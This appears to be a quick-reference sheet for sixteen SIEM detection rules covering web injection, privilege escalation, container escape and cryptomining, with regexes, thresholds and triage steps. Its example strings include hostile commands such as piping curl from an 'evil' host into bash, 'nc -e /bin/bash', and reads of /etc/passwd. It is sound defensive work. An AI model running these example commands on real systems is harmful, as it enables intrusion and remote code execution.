# Phase 3B Detection Rules - Quick Reference

## Rule Summary Table

| Rule ID | Name | Severity | Type | Threshold | Ready | Notes |
|---------|------|----------|------|-----------|-------|-------|
| **REVERSE PROXY EXPLOITATION** |
| PROXY-001 | SQL Injection Attempt | HIGH | Single | - | ✓ | Detects SQL patterns in path |
| PROXY-002 | Command Injection Attempt | HIGH | Single | - | ✓ | Detects shell command patterns |
| PROXY-003 | Path Traversal Attempt | MEDIUM | Single | - | ✓ | Detects ../ directory traversal |
| PROXY-004 | Directory Enumeration | MEDIUM | Aggregation | 20/5m | ✓ | 404 response clustering |
| PROXY-005 | Malicious User Agent | MEDIUM | Single | - | ✓ | Known scanner tools |
| PROXY-006 | HTTP Method Abuse | MEDIUM | Single | - | ✓ | TRACE/TRACK/DEBUG/CONNECT |
| PROXY-007 | Large Request Body DoS | MEDIUM | Single | 50MB | ⚠ | Needs request_size field |
| PROXY-008 | High Request Rate DoS | HIGH | Aggregation | 100/1m | ✓ | Request flooding detection |
| **ACCESS CONTROL & PRIVILEGE** |
| ACCESS-001 | Sudo to Root (Non-Admin) | HIGH | Single | - | ⚠ | Needs user whitelist |
| ACCESS-002 | Unauthorized Admin Access | MEDIUM | Single | - | ⚠ | Needs IP whitelist |
| ACCESS-003 | Unusual Process Execution | HIGH | Single | - | ✓ | Suspicious sudo commands |
| ACCESS-004 | Service Account Login | LOW | Single | - | ✓ | Interactive service account |
| **INFRASTRUCTURE ATTACKS** |
| INFRA-001 | Port Scan Detection | MEDIUM | Aggregation | 10/5m | ⚠ | Needs distinct_count |
| INFRA-002 | Container Escape Attempt | CRITICAL | Single | - | ✓ | Docker breakout techniques |
| INFRA-003 | Unusual Service Restarts | MEDIUM | Aggregation | 5/15m | ✓ | Repeated systemd restarts |
| INFRA-004 | Cryptomining Detection | HIGH | Single | - | ✓ | Known miner processes |

**Legend:**
- ✓ = Ready for deployment
- ⚠ = Partial functionality or conditional

---

## Detection Patterns Quick Lookup

### SQL Injection (PROXY-001)
```regex
'|\"|;|--|\\bOR\\b|\\bUNION\\b|\\bSELECT\\b|\\bINSERT\\b|\\bUPDATE\\b|\\bDELETE\\b
```
**Examples:** `' OR '1'='1`, `UNION SELECT`, `admin'--`

### Command Injection (PROXY-002)
```regex
;\\s*(ls|cat|curl|wget|bash|sh|cmd)|\\||&&|`|\\$\\(|%0a
```
**Examples:** `; ls`, `| cat /etc/passwd`, `$(whoami)`, `curl http://evil | bash`

### Path Traversal (PROXY-003)
```regex
\\.\\./|\\.\\.\\/|\\.\\.\%2f|\\.\\.\%5c
```
**Examples:** `../../../etc/passwd`, `..%2f..%2fetc%2fpasswd`

### Malicious User Agents (PROXY-005)
```regex
sqlmap|nikto|nmap|metasploit|burp|zap|acunetix|nessus|openvas|dirbuster
```
**Examples:** `sqlmap/1.0`, `Nikto/2.1.5`, `Burp Suite`

### Container Escape (INFRA-002)
```regex
docker\\.sock|/proc/self/cgroup|capsh|unshare|nsenter|/host/
```
**Examples:** `/var/run/docker.sock`, `nsenter --target 1`, `/host/etc/passwd`

### Cryptomining (INFRA-004)
```regex
xmrig|minergate|ethminer|cpuminer|cgminer|bfgminer|claymore
```
**Examples:** `xmrig`, `ethminer -pool`, `cpuminer-multi`

### Unusual Processes (ACCESS-003)
```regex
/tmp/|curl.*\\||wget.*\\||bash\\s+-c|python\\s+-c|nc\\s+-[el]
```
**Examples:** `/tmp/malware`, `curl http://evil.com | bash`, `nc -e /bin/bash`

---

## Parser Requirements

### Reverse Proxy Rules
**Required Fields:** `client_ip`, `path`, `method`, `status_code`, `user_agent`
**Parsers:** NGINX Proxy Manager, Traefik, Caddy, NGINX Access Logs

### Access Control Rules
**Required Fields:** `user`, `target_user`, `command`, `hostname`, `tty`
**Parsers:** Linux Sudo, SSH Authentication

### Infrastructure Rules
**Required Fields:** `message`, `program`, `hostname`, `source_ip`
**Parsers:** System Logs (syslog), Docker Logs, Systemd Logs

---

## Aggregation Thresholds

| Rule | Field | Timeframe | Threshold | Rationale |
|------|-------|-----------|-----------|-----------|
| PROXY-004 | client_ip | 5m | 20 | Directory scanning tools |
| PROXY-008 | client_ip | 1m | 100 | DoS attack detection |
| INFRA-001 | source_ip | 5m | 10 | Port scanning activity |
| INFRA-003 | program | 15m | 5 | Service instability |

---

## Severity Escalation Paths

### PROXY-003: Path Traversal
- **Default:** MEDIUM
- **Escalate to CRITICAL if:** `status_code = 200` (successful file access)

### PROXY-004: Directory Enumeration
- **Default:** MEDIUM
- **Escalate to HIGH if:** Combined with PROXY-001 or PROXY-002 from same IP

### ACCESS-001: Sudo to Root
- **Default:** HIGH
- **Escalate to CRITICAL if:** Combined with ACCESS-003 (unusual process)

### INFRA-001: Port Scanning
- **Default:** MEDIUM
- **Escalate to HIGH if:** Followed by successful connection attempts

---

## Backend Feature Dependencies

### IP/User Whitelisting
**Required For:**
- ACCESS-001: Admin user whitelist
- ACCESS-002: Admin IP whitelist

**Implementation Status:** Not yet implemented
**Current Workaround:** Single value check with `not_equals`

### Distinct Count Aggregation
**Required For:**
- INFRA-001: Distinct destination port counting

**Implementation Status:** Not yet implemented
**Current Workaround:** Total connection count only

### Request Size Field
**Required For:**
- PROXY-007: Large request body detection

**Implementation Status:** Parser-dependent
**Current Workaround:** Rule conditional on parser capability

---

## Investigation Quick Actions

### Web Attack (PROXY-001, PROXY-002, PROXY-003)
1. Review full request path and parameters
2. Check HTTP status code (200/5xx = potential success)
3. Block source IP immediately
4. Review application logs
5. Check for data exfiltration or system access

### DoS Attack (PROXY-008, PROXY-007)
1. Check server resource utilization
2. Implement rate limiting
3. Block IP at firewall
4. Monitor for distributed attack pattern
5. Consider DDoS protection

### Privilege Escalation (ACCESS-001, ACCESS-003)
1. Verify user identity and authorization
2. Review command being executed
3. Check for account compromise indicators
4. Audit all actions taken as root
5. Revoke access if unauthorized

### Infrastructure Attack (INFRA-002, INFRA-004)
1. Isolate affected system immediately
2. Terminate malicious processes
3. Check for persistence mechanisms
4. Review system access logs
5. Scan for additional malware
6. Restore from clean backup if necessary

---

## Tuning Recommendations

### High Traffic Environments
- **PROXY-008:** Increase threshold to 200/1m
- **PROXY-004:** Increase threshold to 50/5m or 10m timeframe
- **INFRA-001:** Increase threshold to 20/5m

### File Upload Services (Nextcloud, Immich)
- **PROXY-007:** Whitelist upload endpoints or increase to 100MB+

### Development/Testing Environments
- **PROXY-005:** Whitelist authorized security testing IPs
- **All rules:** Consider disabling or increasing thresholds

### Multi-Admin Environments
- **ACCESS-001:** Maintain accurate admin user list
- **ACCESS-002:** Use CIDR ranges for admin networks

---

## Common False Positives

### PROXY-005: Malicious User Agent
- **Cause:** Authorized penetration testing
- **Solution:** Whitelist testing IPs/timeframes

### PROXY-006: HTTP Method Abuse
- **Cause:** CORS preflight OPTIONS requests
- **Solution:** Whitelist OPTIONS for API endpoints

### ACCESS-004: Service Account Login
- **Cause:** Legitimate service account interactive login
- **Solution:** Document and whitelist specific service accounts

### INFRA-003: Unusual Service Restarts
- **Cause:** Service updates, configuration changes
- **Solution:** Document maintenance windows, whitelist known unstable services

---

## Testing Checklist

### Per-Rule Testing
- [ ] Positive case: Rule triggers on attack pattern
- [ ] Negative case: Rule does NOT trigger on normal traffic
- [ ] Threshold test: Verify aggregation boundaries
- [ ] Variable substitution: Check alert formatting
- [ ] Field extraction: Verify all required fields present

### Integration Testing
- [ ] Multi-rule correlation (attack chains)
- [ ] Parser compatibility verification
- [ ] Performance under load
- [ ] Alert fatigue assessment
- [ ] False positive rate < 5%

---

## Deployment Order Recommendation

### Phase 1: Low Risk Rules (Test First)
1. ACCESS-004 (LOW severity, informational)
2. PROXY-005 (MEDIUM, easy to whitelist)
3. PROXY-006 (MEDIUM, OPTIONS whitelist)

### Phase 2: Detection Rules (Core Functionality)
4. PROXY-001 (SQL injection - HIGH)
5. PROXY-002 (Command injection - HIGH)
6. PROXY-003 (Path traversal - MEDIUM)
7. INFRA-004 (Cryptomining - HIGH)

### Phase 3: Aggregation Rules (Tune Thresholds)
8. PROXY-004 (Directory enum - MEDIUM)
9. PROXY-008 (Request rate - HIGH)
10. INFRA-003 (Service restarts - MEDIUM)

### Phase 4: Critical Rules (After Tuning)
11. INFRA-002 (Container escape - CRITICAL)
12. ACCESS-001 (Sudo to root - HIGH)
13. ACCESS-003 (Unusual processes - HIGH)

### Phase 5: Conditional Rules (As Available)
14. PROXY-007 (Request size - if parser supports)
15. ACCESS-002 (Admin access - if whitelist implemented)
16. INFRA-001 (Port scan - if distinct_count implemented)

---

## File Locations

```
/rules/reverse-proxy/
  ├── PROXY-001-sql-injection.yaml
  ├── PROXY-002-command-injection.yaml
  ├── PROXY-003-path-traversal.yaml
  ├── PROXY-004-directory-enumeration.yaml
  ├── PROXY-005-malicious-user-agent.yaml
  ├── PROXY-006-http-method-abuse.yaml
  ├── PROXY-007-large-request-body.yaml
  └── PROXY-008-high-request-rate.yaml

/rules/access-control/
  ├── ACCESS-001-sudo-to-root.yaml
  ├── ACCESS-002-unauthorized-admin-access.yaml
  ├── ACCESS-003-unusual-process-execution.yaml
  └── ACCESS-004-service-account-login.yaml

/rules/infrastructure/
  ├── INFRA-001-port-scanning.yaml
  ├── INFRA-002-container-escape.yaml
  ├── INFRA-003-unusual-service-restarts.yaml
  └── INFRA-004-cryptomining-detection.yaml
```

---

**Phase 3B Implementation Complete**
**Date:** 2025-12-03
**Total Rules:** 16
**Deployment Ready:** 13 (81%)
